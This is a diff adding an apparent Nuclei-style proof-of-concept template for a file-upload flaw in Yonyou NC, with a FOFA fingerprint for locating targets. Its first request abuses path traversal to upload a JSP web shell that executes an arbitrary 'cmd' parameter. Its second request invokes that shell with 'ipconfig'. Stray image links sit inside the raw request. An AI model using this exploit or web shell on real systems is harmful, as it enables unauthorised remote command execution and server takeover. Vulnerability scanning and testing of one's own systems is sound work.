@@ -1,0 +1,62 @@
+id: poc-ca303gom8lhmbqfa
+info:
+  name: 用友 NC uploadFile 文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ca303gom8lhmbqfa'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ca303gom8lhmbqfa
+    fofa: icon_hash="1085941792"
+http:
+- raw:
+  - 'POST /mp/initcfg/../uploadControl/uploadFile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6
+
+
+
+    ------WebKitFormBoundaryHHaZAYecVOf5sfa6
+
+    Content-Disposition: form-data; name="file"; filename="test.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryHHaZAYecVOf5sfa6
+
+    Content-Disposition: form-data; name="submit"
+
+
+    上传
+
+    ------WebKitFormBoundaryHHaZAYecVOf5sfa6--
+
+
+
+    上传位置'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /mp/uploadFileDir/test.jsp?cmd=ipconfig HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1727413587020-50e11dcb-7d60-49ea-a281-e800fcbb4da3.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1727413587282-bacc6640-dee4-44f3-9f0c-03a536b6d26a.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
